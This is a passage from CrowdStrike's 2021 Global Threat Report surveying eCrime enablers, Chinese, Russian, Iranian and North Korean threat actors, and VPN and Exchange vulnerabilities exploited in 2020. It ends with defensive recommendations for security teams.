campaigns, maximize profitability and increase the possibility of their success.
The downloader Amadey Loader and SMOKY SPIDER’s Smoke Bot remain popular
among a variety of actors. NARWHAL SPIDER’s Cutwail v2 spambot was heavily
utilized by DOPPEL SPIDER, and MUMMY SPIDER’s Emotet was leveraged by

Banking Trojan Operators Continue to Evolve Their
Operational Model
As noted, access brokers focus primarily on providing varying levels of access
for sale on criminal forums. In keeping with this trend, CrowdStrike Intelligence
observed criminal adversaries that traditionally operate banking trojans providing
third-party access as well. Although LUNAR SPIDER has previously been known
to offer malware distribution, recent BokBot infections have led directly to handson-keyboard activity rather than deploying malware. LUNAR SPIDER has been
observed supporting SPRITE SPIDER Defray777 campaigns but likely supports
other BGH adversaries.
MALLARD SPIDER is also likely acting as an access broker for BGH ransomware
operators. There have been multiple instances in which QakBot infections have
led to the deployment of ransomware, including Egregor, Maze, DoppelPaymer,
MedusaLocker and ProLock. Given that MALLARD SPIDER has historically been an
insular group, they are likely selling access to these ransomware operators through
private channels.

Region Highlight: LATAM-Origin eCrime
During 2020, CrowdStrike Intelligence tracked multiple variants of informationstealing malware originating from Latin America (LATAM) and likely developed by
LATAM-based eCrime actors. These malware families include Culebra Variant, Salve,
Caiman and Kiron. The malware is available to purchase on underground forums,
resulting in its operation by multiple criminal actors. The most popular infection
vector has been spam campaigns that rely on social engineering techniques to
encourage interaction with hyperlinks in the email body, often using lure content with
a financial or COVID-19-related theme.
Though traditionally observed targeting entities within LATAM countries, the
campaigns occasionally expanded to Spain or Portugal, often repurposing the same
Spanish- or Portuguese-language content as the original LATAM-focused campaign.
During 2020, CrowdStrike Intelligence observed the use of new lure content and
languages, including French and Italian. It is likely that, having established their
TTPs, these eCrime actors are now expanding their focus to European countries.
Ultimately, a successful infection relies on the victim interacting with the email and
its malicious content, so tailoring the email to the language of the target country and
using emotive themes improve infection rates.

32

CrowdStrike

2021 Global Threat Report

Outlook
Enablers will continue to be important actors in the eCrime ecosystem. Similar to
LUNAR SPIDER and MALLARD SPIDER, it is likely that criminal actors operating
botnets will attempt to capitalize on their infections by offering access to others.
While enablers maintain a constant presence on criminal forums, more sophisticated
actors continue to support others through private channels. It is likely that as some
of these access brokers become more sophisticated, they may move away from
forums to sell their wares.
Criminal actors operating out of LATAM appear to be increasing and will likely
continue to develop and upgrade a variety of malware variants. As LATAM-based
criminal operators become more comfortable with their TTPs, campaigns using
linguistic ties to target European countries are expected to be observed in 2021.

By all accounts, 2020 was a challenging year for Beijing. The outbreak of
COVID-19 — with Wuhan as its epicenter — and managing the fallout of its global
spread consumed much of the Chinese Communist Party's (CCP) efforts. A brief
reduction in activity from Wuhan-based adversaries demonstrated that COVID-19
had a tactical impact as well as a strategic one. The outbreak was coupled with an
increasingly aggressive trade war with the U.S., limiting Chinese firms’ access to
critical technologies such as semiconductors, while at the same time levying high
tariffs on goods destined for foreign markets.
China-based adversaries continued targeted operations throughout 2020 that
largely aligned with historic focuses on espionage, intellectual property theft

CHINA
Previewing the 14th Five-Year Plan
In October 2020, the CCP outlined the party's 14th Five-Year Plan (14FYP/十四个五年
规划) lasting from 2021-2025 and the Long-Term Vision for 2035 (2035 Vision/2035
远景目标). Though the new plan will not become formalized until March 2021, a
preliminary communique released following the October meeting outlined the CCP’s
overall ambitions, with areas of focus to include:
1.	Technology and Research & Development: Improve scientific and
technological self-reliance and support innovation-driven technological
breakthroughs.
2.	Economic Data: Enhance domestic market and build a high-level socialist
market economic system.
3.	Agriculture and Clean Energy: Promote green development, and agricultural
and rural development.
4.	Urban Planning: Optimize layout of urban and rural development; alleviate
poverty in rural areas.
5.	Healthcare and Insurance: Improve quality of life and equalization of basic
public services; create a comprehensive health system.
6. Media: Improve the country’s cultural soft power and cultural industry.
7.	Defense: Accelerate the modernization of national defense and the army to
support the objectives of a rich country and a strong military.
Achieving new technological breakthroughs will likely underpin nearly all of China’s
short- and medium-term goals. The CCP’s technology transfer programs combine
physical and cyber methodologies to identify key intelligence gaps and then seek
to satisfy those gaps via cyber theft, cyber espionage, joint ventures or corporate
acquisitions. CrowdStrike Intelligence assesses with high confidence that Chinanexus adversaries will almost certainly continue to support these objectives in 2021
in the absence of any meaningful consequences. The CCP’s mention of accelerating
its military and soft power within the 14FYP is also notable and suggests continuing
efforts to improve the People's Liberation Army Strategic Support Force (PLASSF)
and Chinese cyber forces.

Outlook
Though 2020 saw a high increase in the number of China-related U.S. DOJ
indictments, as well as significant tariffs levied by the U.S., these had relatively little
impact on China’s cyber operational tempo, as evidenced by WICKED PANDA’s
return mere weeks after its public indictment. Critical improvements to watch for
from China in 2021 include a resurgence of PLASSF-affiliated adversaries with

improved TTPs, and increasingly focused and automated disinformation campaigns.
Prior to the 2015 PLASSF reorganization announcement, PLA-associated
adversaries regularly targeted government, military, defense, academic and think
tank organizations, among others. CrowdStrike Intelligence assesses with high
confidence that this targeting pattern will likely return as these adversaries seek to
re-establish themselves. China's cyber operators are also likely to continue enabling
the widely reported human rights abuses against Tibetans and Uyghur minorities,
domestic and abroad, through aggressive surveillance measures including mobile
device targeting, compromise of personal email accounts and devices, and ongoing
access to upstream providers.
More contemporary China-based operators are likely to continue to diversify their
tradecraft and toolsets and improve their operational techniques, as evidenced
by recent malware developments, such as AvantGard, Clambling (the successor
of PlugX) and ShadowPad. China-nexus adversaries will also likely continue to
utilize commoditized and open-source tools such as Cobalt Strike and Mimikatz.
CrowdStrike Intelligence assesses these groups will also likely continue to conduct
software supply-chain compromises, given their prior successes throughout late
2019 and 2020.

RUSSIA
↘
While there may be
some tactical-level
changes to Russian
operations in the short
term, adversary action
was not significantly
deterred overall in 2020.

Throughout 2020, the activities of several Russian-nexus adversaries, particularly
state-operated groups, were the subject of public disclosure through the release of
statements made by Western government organizations. The quantity and breadth
of information released regarding Russian intrusion operations is unprecedented and
likely reflects a focused effort to disrupt these activities by enabling defenders and
using “soft messaging” techniques designed to influence adversary behavior.
While there may be some tactical-level changes to Russian operations in the short
term — for example, CrowdStrike Intelligence has observed a continued reduction
in malware-driven FANCY BEAR operations, as well as ongoing development of
VENOMOUS BEAR tooling — adversary action was not significantly deterred
overall in 2020. BERSERK BEAR demonstrated significantly elevated targeting of
Western organizations during 2020, mainly driven by campaigns that have been
observed throughout the year against government and transport sectors in North
America. Meanwhile, PRIMITIVE BEAR maintained their Ukrainian-centric interest,
with sighting of regular activity targeting Ukrainian government and official bodies.
This actor demonstrated significant maturation with their attempts to improve their
operational security, tradecraft and tooling.

TTP Highlight: Targeting VPN Connections
A common initial network compromise TTP observed across multiple Russian
adversaries in 2020 was attempting to gain access to targets through the exploitation
of internet-accessible network devices and services, particularly those supporting
virtual private network (VPN) connections. These techniques have the benefit of being
relatively covert if the attempts fail, but can yield extensive access if they succeed. It
is worth noting that much of the reported exploitation activity against these devices
target previously patched vulnerabilities, and therefore it is possible that future
intrusions may be supported by the exploitation of zero-day vulnerabilities if target
networks are found to be hardened against an adversary’s current capability.

Outlook
In previous years, Russian state-operated groups have been characterized by
significant investment in the development and deployment of custom malware
families to support their intelligence gathering activities. With this dependency
comes increased scrutiny from security researchers and network defenders,
increasing the resource costs for adversaries that have to continually update their
toolsets to evade detection. While various Russian adversaries continue to employ
malware as part of their operational toolkits, they have also increasingly sought
to shortcut traditional operational workflows and focus directly on intelligence
collection from third-party services used by their targets, including direct access
to cloud-based network resources such as email servers. CrowdStrike Intelligence
anticipates this trend is likely to continue in 2021, with previous attempts to breach
single accounts via phishing campaigns making way for larger-scale operations
against enterprise assets using compromised administrator credentials.
From a geopolitical perspective, to counter historically low domestic approval for
President Vladimir Putin amid ongoing COVID-19-related economic contraction in
2021, Russia will likely continue to assert its interests abroad, particularly in hotspots
such as Nagorno-Karabakh and Ukraine, while deepening ties with strategic partners
such as China and select African nations. To this end, Russia is likely to continue to
conduct cyber-enabled espionage against Western military and political targets, and
in key sectors related to the energy, defense and high-tech industries. Moscow’s
relationship with the U.S. is likely to remain adversarial in 2021, with the transition
to U.S. President Joseph Biden unlikely to improve relations with Russia or reduce
state-sponsored cyber operations targeting political and military intelligence related
to the U.S. and its European allies. Further, Russia will likely continue to conduct
information operations against geopolitical competitors, particularly the U.S. These
historically include leaks and intrusions, with targeting that exploits internal political
divisions or instability to exacerbate existing tensions.

Iranian adversaries are
likely to place further
focus on the exploitation
of network services to
enable intrusion into
target networks in 2021.

Iranian targeted-intrusion adversaries were active throughout 2020. In contrast to
expectations related to major developments early in 2020, such as the killing of
Qassem Soleimani of the Islamic Revolutionary Guards Corps (IRGC) Quds Force, the
overwhelming majority of this activity appears to have been espionage-oriented. Even
as the COVID-19 pandemic significantly affected Iran, these adversaries’ activities
more generally reflected traditional intelligence requirements, although there were
some exceptions. Notable developments included COVID-19-related targeting by
STATIC KITTEN, the emergence of a discretely targeted collection enterprise
adjacent to HELIX KITTEN, and PIONEER KITTEN being linked to eCrime activity,
shifting focus from intelligence collection to disruptive ransomware operations.
CrowdStrike Intelligence assesses with moderate confidence that Iranian
adversaries are likely to place further focus on the exploitation of network services to
enable intrusion into target networks in 2021, reducing — but not eliminating — their
use of other client-focused intrusion methods such as strategic web compromises
(SWCs) or spear-phishing attacks.

Discrete Separation of Targeting Between Adversaries
Throughout 2020, multiple Iranian targeted-intrusion actors were observed
exhibiting a particular behavior: targeting only a specific sector or geographic area.
Targeted-intrusion adversaries, including those with an Iranian nexus, typically
target multiple regions and sectors concurrently. However, in four separate
cases, adversaries with varying technical links to HELIX KITTEN each exhibited
a distinct and narrowly focused target scope during their 2020 activities. These
adversaries included HELIX KITTEN itself, TRACER KITTEN, and the activity
clusters DistortedShepherd and ScorchedEpoch. Table 7 shows these adversaries’
respective target scopes and technical links to HELIX KITTEN.

These technical links to HELIX KITTEN parallel similar connections previously
identified between HELIX KITTEN and REMIX KITTEN, the latter of which also
has exhibited a specifically counterintelligence-oriented target scope over time.
These points indicate it is likely that all five adversaries share, to some degree, an
operational support entity that engages in activity such as malware development
and infrastructure management. The likely presence of a shared support element,
combined with the existence of discretely separated target scopes between
adversaries, is indicative of a broader, unified intelligence collection enterprise that
is directed and coordinated by a central authority (such as a foreign intelligence
service). The precise contours of that enterprise are actively under investigation.

Iran-based Adversaries Blend eCrime and Targeted
Intrusion Tradecraft
Since mid-2020, there has been emerging evidence of eCrime tactics converging
with Iran-nexus targeted intrusion operations. The first case of this convergence
was in July 2020, when an actor associated with PIONEER KITTEN was identified
advertising to sell access to compromised networks on an underground forum.
That activity highly likely represented PIONEER KITTEN operators attempting to
generate personal gain via the unapproved sale of accesses originally secured at
the behest of the Iranian government for intelligence operations purposes. Also

Consistent Iranian
Hacktivist Activity
In addition to targeted
intrusion activity, Iranian
hacktivists continued to
launch operations parallel
to the foreign policy
objectives of the Iranian
government throughout
2020. Such operations
came about most
frequently in response
to sporadic escalations
in regional tensions,
especially during instances
of widespread media
speculation surrounding
Israeli actions toward Iran,
such as the purported
Israeli sabotaging of Iranian
nuclear facilities and, most
starkly, the November
assassination of Iranian
nuclear scientist Mohsen
Fakhrizadeh. Groups
such as ICTUS Team,
Unidentified Team and
Bax026 (aka FRONTLINE
JACKAL) have maintained
social media channels
for the dissemination of
nationalistic messaging
as well as claims of
network compromise of
infrastructure belonging to
organizations within Israel
and allied governments,
especially the United
States.

during July 2020, there was an overlap between targeted intrusion operations
by STATIC KITTEN and disruption-oriented Thanos ransomware activity by the
TarnishedGauntlet activity cluster. This overlap included both the adversary and
the activity cluster targeting the same victims at the same time, which could
represent coordinated intrusion activity between the two actors. Finally, since at
least November 2020, PIONEER KITTEN has been conducting a disruption-oriented
ransomware campaign leveraging the Pay2Key ransomware variant, primarily
deployed against Israeli targets. Unlike that adversary’s earlier eCrime activity, this
Pay2Key activity is likely being undertaken at the direction of the Iranian government
and appears not to be oriented toward revenue generation.

Outlook
While coordination between STATIC KITTEN and TarnishedGauntlet remains
uncorroborated, PIONEER KITTEN’s shift toward disruptive ransomware operations
eerily parallels the disruptive impacts of TarnishedGauntlet’s Thanos operations
against STATIC KITTEN victims. As Iranian adversaries continue to be publicly
targeted by dissident entities, leak outlets, Western government advisories, and
industry reporting, it is likely that Iranian cyber operations will continue to experiment
with blurring the lines between eCrime and targeted intrusion tradecraft in order
to generate desired effects or at least complicate attempts at attribution. This is
anticipated to occur while Iranian adversaries continue to engage in traditional
intelligence activities, as well as support information operations. It remains to be
seen whether or not the unified intelligence collection enterprise surrounding HELIX
KITTEN will continue to exhibit discrete collection foci or if it will shift in response to
future developments.
In 2020, Iran elected an IRGC-dominated parliament and experienced worsening
relations with its principal rivals, the U.S., Saudi Arabia and Israel. In 2021, Iranian
cyber adversaries and Iran-backed militias are likely to remain engaged in
ongoing, low-level conflicts focused on targeting these countries; these conflicts
have historically been highlighted by instances of kinetic action and disruptive
cyberattacks by both sides. Iran is also likely to experience increasing regional
isolation following significant diplomatic overtures by Gulf Arab states to Israel,
and expectations for 2021 to see a potential hardliner, IRGC-backed presidential
candidate emerge victorious. CrowdStrike Intelligence assesses that these factors
will likely contribute a highly permissive environment for Iranian cyber adversaries to
aid internal suppression and pursue targeted intrusions abroad.

N. KOREA
↘
In 2020,
DPRK operations
broadly exhibited
a twofold mission:
intelligence collection
and currency
generation.

CrowdStrike Intelligence tracked activity from all five named DPRK adversaries —
LABYRINTH CHOLLIMA, STARDUST CHOLLIMA, SILENT CHOLLIMA, VELVET
CHOLLIMA and RICOCHET CHOLLIMA — in 2020. DPRK operations this year
broadly exhibited a twofold mission, focusing on intelligence collection and currency
generation. Campaigns have primarily been aimed at North America, Europe,
South Korea and Japan. Espionage operations have centered on East Asia/Korea
foreign policy and military technology. With the start of the COVID-19 pandemic,
CrowdStrike Intelligence observed multiple DPRK adversaries expand their target
scopes to the healthcare sector. Observed efforts from DPRK actors centered on
companies leading research on COVID-19 vaccine candidates, and it is likely these
adversaries were focused on gathering intellectual property that could assist North
Korea in the development of its own vaccine.
Cyber-enabled currency generation continued apace in 2020; however, DPRK
adversaries placed a greater emphasis on obtaining capital through more common
eCrime tactics such as ransomware, extortion, and the targeting of cryptocurrency
exchanges, rather than through the complex infiltrations that manipulated financial
infrastructure, as previously seen from North Korea.

Actor Highlight: LABYRINTH CHOLLIMA
Throughout much of 2020, LABYRINTH CHOLLIMA was not only the most prolific
DPRK adversary, but also one of the most active targeted-intrusion adversaries
tracked by CrowdStrike Intelligence. CrowdStrike Intelligence observed the
deployment of several new LABYRINTH CHOLLIMA tools during the year.
New tooling does not appear to represent a significant deviation in technical
sophistication from previously observed LABYRINTH CHOLLIMA implants; however,
there appears to be an emphasis on operational security and defeating signaturebased detections with these new tools. For instance, both NedDownloader and
UnderGround RAT — as well as an unnamed malicious PDF viewer — rely on
trojanized variants of legitimate applications, techniques that allow LABYRINTH
CHOLLIMA to effectively avoid YARA detections and automated malware analysis in
sandbox environments. Tooling has also placed greater emphasis on cross-platform
coverage, with multiple new LABYRINTH CHOLLIMA tools now targeting MacOS
and Linux operating systems, in addition to Windows.
LABYRINTH CHOLLIMA also began to rely heavily on LinkedIn personas as an
intrusion vector in 2020. Across operations targeting the defense, media, financial
and healthcare sectors, LABYRINTH CHOLLIMA has used LinkedIn profiles

disguised as human resources recruiters to contact targets. Following initial contact,
the adversary attempts to move the conversation to an encrypted communications
channel, such as WhatsApp or Telegram, where it sends a malicious document —
often disguised as a job description for a lucrative opportunity — that will retrieve
additional payloads. To make personas appear legitimate and to directly interact
with targets without raising suspicion, this tactic requires significant research and
preparation, highlighting the level of effort LABYRINTH CHOLLIMA makes in order
to successfully infiltrate an organization.

Shift in Currency Generation Strategy
DPRK adversaries have conducted cyber-enabled theft since at least 2015 to evade
international and U.S. economic sanctions and generate a stream of funding to
support other state initiatives. In 2020, CrowdStrike Intelligence observed VELVET
CHOLLIMA, LABYRINTH CHOLLIMA and STARDUST CHOLLIMA continue to
engage in currency generation operations (Table 8).

in currency generation operations, targeting key elements of the global financial
ecosystem such as the SWIFT international money wiring protocol, ATM networks,
and payment processors, racking up large payouts in the tens of millions of U.S.
dollars. In 2020, CrowdStrike Intelligence observed STARDUST CHOLLIMA appear to
shift from operations targeting large financial institution intrusions and move toward
cryptocurrency exchanges. This trend runs parallel to VELVET CHOLLIMA and
LABYRINTH CHOLLIMA operations, which have similarly targeted cryptocurrency
exchanges and have increasingly relied on eCrime tactics such as JavaScript card
skimming, cryptocurrency wallet credential theft, and deployment of ransomware.

CrowdStrike

2021 Global Threat Report

N. KOREA
DPRK’s focus on the acquisition of cryptocurrency and the increasing adoption of
eCrime tradecraft are logical developments; the environments of cryptocurrency
exchanges are typically not as hardened as those of traditional financial
institutions, and illicitly obtained cryptocurrency is much easier to move and launder
anonymously, likely making it a preferred cashout vector versus fiat currencies. The
use of criminal tooling and tradecraft further obfuscates attribution efforts and can
avoid notice by security defenders looking for sophisticated attacks.

Outlook
In 2020, the North Korean economy contracted acutely, putting the already
impoverished country into the worst economic situation it has faced since the
famines of the late 1990s. This contraction is due primarily to an abrupt cessation
in trade with China, which resulted from Pyongyang’s closure of its border with
China in January 2020 to prevent the spread of COVID-19 into the country. These
issues have been compounded by severe typhoons and flooding throughout Q3
2020, which acutely decreased agricultural yield. In the absence of foreign aid and
sanctions relief, these disruptions in the agricultural supply chain and the inability to
import food from China put DPRK at the highest risk of domestic famine and food
insecurity in decades.
Currency generation operations will therefore likely increase over the next year
to compensate for the economic downturn and serve as a lifeline for the country.
Moreover, DPRK adversaries may increase economic espionage operations
specifically focused against the agricultural sector in an attempt to steal technology
that could ameliorate some of the effects of an impending food shortage.
The DPRK government is likely to continue to pursue economic sanctions relief
and foreign aid from the international community. Diplomatic maneuvering will likely
drive increased espionage activity aimed at the Korean foreign policy community, as
DPRK’s leadership seeks to assure a decision advantage in negotiations. COVID-19
will also likely continue to affect DPRK through the majority of 2021. CrowdStrike
Intelligence assesses that entities involved with the research, production or
distribution of COVID-19 therapeutics will be at a high risk of North Korean targeted
intrusions until a vaccine is widely available in North Korea.

Vulnerability Intelligence

During 2020,
CrowdStrike Intelligence
observed repeated
exploitation of several
different VPN services
and web applications.

T

he consequential vulnerabilities observed throughout 2020 are
characterized by their relationships with internet-exposed remote
services. These vulnerabilities are attractive to nation-state and eCrime
actors because they potentially grant initial access to target networks.
During 2020, CrowdStrike Intelligence observed repeated exploitation of several
different VPN services and web applications such as Microsoft SharePoint (CVE2019-0604). The compromise of these services in turn enabled “exploit chaining”
with other vulnerabilities for the purposes of privilege escalation and network
pivoting. Of these, known vulnerabilities in Microsoft Exchange Server (CVE-20200688) and Windows Netlogon (CVE-2020-1472) often serve to enable network
propagation and lateral movement.

Exposure and Reliability
The prevalence and general exposure of a vulnerable product, in addition to the
reliability of available exploit code, largely dictate the usefulness of a vulnerability
to threat actors. These traits apply to CVE-2019-0604 and CVE-2020-0688, which
were among the exploits most commonly observed by CrowdStrike during 2020.
These two exploits are derived from known vulnerabilities in Microsoft SharePoint
and Exchange, respectively — services that are both widely deployed and internetfacing in the majority of environments. Furthermore, the available exploit code
provides consistent, reliable means for gaining initial access (CVE-2019-0604)
or escalating privileges and control of a victim domain (CVE-2020-0688) without
introducing system instability.

Interdependencies: Exploits and Credential-Based
Attacks
CrowdStrike Intelligence assesses that remote service and privilege escalation
vulnerabilities enable the viability of credential-based attacks (e.g., brute forcing,
password spraying, credential stuffing). This assessment is made with moderate
confidence based on in-the-wild attacks and other reporting pertaining to
access brokers. Once actors have demonstrated the necessary reconnaissance,
exploitation, and automated credential-based attack mechanisms, exploitation and
credential theft activities reinforce and support one another in a self-sustaining
process (Figure 10).

Figure 10. Stages of the Repetitive Exploitation and Credential Acquisition Cycle

The process begins with the scanning/exploitation of remote services to harvest
user account credentials. For example, in late 2020, CVE-2018-13379 allowed for the
dumping of user account directories from nearly 50,000 FortiOS VPNs. Even after
patching, threat actors can often use these stolen credentials to reacquire access
to the same targets (or to other networks where victims reused passwords) via
credential-based techniques. In these situations, the stolen logins also introduce the
threat of a privilege escalation from an authenticated user (e.g., CVE-2020-0688),
pivoting and eventual domain takeover. At this point, an adversary can obtain all Active
Directory accounts for future credential-based attacks as the cycle begins anew.

Recommendations
↘
These recommendations
will help you proactively
address potential
weaknesses before they
can be leveraged by
attackers.

O

ver the past year, CrowdStrike Intelligence and CrowdStrike Falcon
OverWatch observed adversaries not only undeterred by COVID-19
but seemingly spurred on by the impacts of the global pandemic.
Targeted intrusion adversaries took action to secure valuable
data on vaccine research and government responses to the pandemic, and even
criminal adversaries like CARBON SPIDER — facing a reduction of profits due to
the pandemic — proved their flexibility in the face of adversity. In 2021, adversaries
employing BGH operations will continue to investigate methods to maximize their
impact on targets, likely including custom development to support non-traditional
targets within an organization.
As their operations mature, both eCrime and targeted intrusion adversaries will
continue to develop and implement new methods to bypass detection and impede
analysis by researchers. Whether driven by public reporting or motivations internal
to their respective organizations, the pursuit of operational security will almost
certainly include improved obfuscation methods, use of commodity tooling and
living-off-the-land techniques.
The challenges of 2020, including the rapid pivot to “work-from-anywhere,” have
caused a level of social and economic upheaval that is unprecedented in modern
times. The widespread impact has not deterred cyber adversaries — in fact,
quite the opposite has occurred. In 2020, CrowdStrike observed adversaries
exploiting the situation, preying on the public’s fear and escalating attacks. These
recommendations will help you proactively address potential weaknesses before
they can be leveraged by attackers.
If you can’t see it, you can’t protect it. For security teams operating in today’s
environment, visibility and speed are critical for blocking attackers that have the
capability and intent to steal data and disrupt operations. Security teams must
understand that it is their responsibility to secure their cloud environments, just as
they would on-premises systems. They must establish consistent visibility for all
environments and proactively address potential vulnerabilities before they can be
leveraged by attackers.					
Protect identities and access. Organizations must consider multifactor
authentication (MFA) on all public-facing employee services and portals as
mandatory. In addition to MFA, a robust privilege access management process will
limit the damage adversaries can do if they get in, and reduce the likelihood of lateral
movement. Finally, Zero Trust solutions should be implemented to compartmentalize
and restrict data access, thus reducing the potential damages from unauthorized
access to sensitive information.					
Invest in expert threat hunting. Interactive attacks use stealthy or novel techniques
designed to bypass automated monitoring and detection. Continuous threat hunting
is the best way to detect and prevent sophisticated or persistent attacks.

2021 Global Threat Report

CrowdStrike

							 			
Get ahead of attackers with threat intelligence. There is a human being behind
every attack. Threat intelligence helps you understand an attacker's motivation, skills
and tradecraft so you can use this knowledge to your advantage to prevent, and
even predict, future attacks. 					
Make sure you have a current cybersecurity policy that accounts for remote
working. Security policies need to include access management for remote workers,
the use of personal devices, and updated data privacy considerations for employee
access to documents and other information.
Create a culture of cybersecurity. While technology is clearly critical in the fight to
detect and stop intrusions, the end user remains a crucial link in the chain to stop
breaches. User awareness programs should be initiated to combat the continued
threat of phishing and related social engineering techniques.
